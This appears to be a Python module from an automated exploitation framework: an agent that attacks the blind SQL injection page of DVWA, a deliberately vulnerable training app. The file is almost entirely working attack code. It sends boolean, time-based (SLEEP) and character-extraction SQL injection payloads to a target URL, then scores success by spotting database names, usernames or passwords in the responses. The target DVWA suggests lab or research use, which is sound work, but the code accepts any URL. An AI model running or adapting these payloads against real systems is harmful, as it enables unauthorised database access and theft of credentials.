"""Tier 1 blind SQL injection agent."""

from __future__ import annotations

from typing import Any

from agents.base_agent import BaseAgent
from agents.state_utils import make_update, module_endpoint, normalize_security_level
from core.state import ExploitationState
from foundation.payload_library import PayloadLibrary
from foundation.session_manager import DVWASession
from foundation.verifier import Verifier


class BlindSQLiAgent(BaseAgent):
    module_name = "sqli_blind"

    def __init__(self) -> None:
        self.payloads = PayloadLibrary()
        self.verifier = Verifier()

    def run(self, state: ExploitationState) -> dict[str, Any]:
        target_url = state.get("target_url", "")
        level = normalize_security_level(state.get("security_level"))
        endpoint = module_endpoint(state, self.module_name, "/vulnerabilities/sqli_blind/")
        payload_set = self.payloads.get(self.module_name, level)

        score = 0
        confirmed: list[str] = []
        outcomes: list[str] = []
        tried_now: list[str] = []

        max_iterations = int(state.get("max_iterations", 30))
        iteration_count = int(state.get("iteration_count", 0))
        remaining_budget = max(0, max_iterations - iteration_count)

        if not target_url:
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        session = DVWASession(target_url)
        try:
            # Stage 1: boolean differential probe
            boolean_payloads = payload_set.probe[:2]
            if len(boolean_payloads) < 2:
                boolean_payloads = ["1' AND 1=1-- -", "1' AND 1=2-- -"]

            true_resp = session.get(endpoint, params={"id": boolean_payloads[0], "Submit": "Submit"})
            false_resp = session.get(endpoint, params={"id": boolean_payloads[1], "Submit": "Submit"})
            tried_now.extend(boolean_payloads)

            if (true_resp.text or "") != (false_resp.text or ""):
                score = max(score, 1)
                confirmed.append("blind_sqli_confirmed")

            # Stage 2: time-based probe
            sleep_payload = payload_set.exploit[0] if payload_set.exploit else "1' AND SLEEP(3)-- -"
            sleep_resp = session.get(endpoint, params={"id": sleep_payload, "Submit": "Submit"})
            tried_now.append(sleep_payload)
            if float(getattr(sleep_resp, "elapsed_ms", 0.0)) > 2500:
                score = max(score, 2)

            # Stage 3: extraction (budget-gated)
            if remaining_budget >= 5 and score >= 1:
                extract_payload = (
                    payload_set.exploit[1]
                    if len(payload_set.exploit) > 1
                    else "1' AND ASCII(SUBSTR(database(),1,1))>77-- -"
                )
                extract_resp = session.get(
                    endpoint,
                    params={"id": extract_payload, "Submit": "Submit"},
                )
                tried_now.append(extract_payload)
                body = extract_resp.text or ""

                if self.verifier.contains_any(body, ["database", "information_schema", "dvwa"]).ok:
                    score = max(score, 3)
                    if "data_exfiltrated" not in confirmed:
                        confirmed.append("data_exfiltrated")
                    outcomes.append("data_exfiltrated")

                if self.verifier.contains_any(body, ["admin", "password", "user"]).ok:
                    score = 4
                    if "data_exfiltrated" not in confirmed:
                        confirmed.append("data_exfiltrated")
                    outcomes = ["data_exfiltrated"]
        except Exception:
            pass
        finally:
            session.close()

        return make_update(
            state=state,
            module_name=self.module_name,
            score=score,
            tried_payloads=tried_now,
            confirmed_vulns=confirmed,
            achieved_outcomes=outcomes,
        )


_AGENT = BlindSQLiAgent()


def sqli_blind_agent(state: ExploitationState) -> dict[str, Any]:
    return _AGENT.run(state)
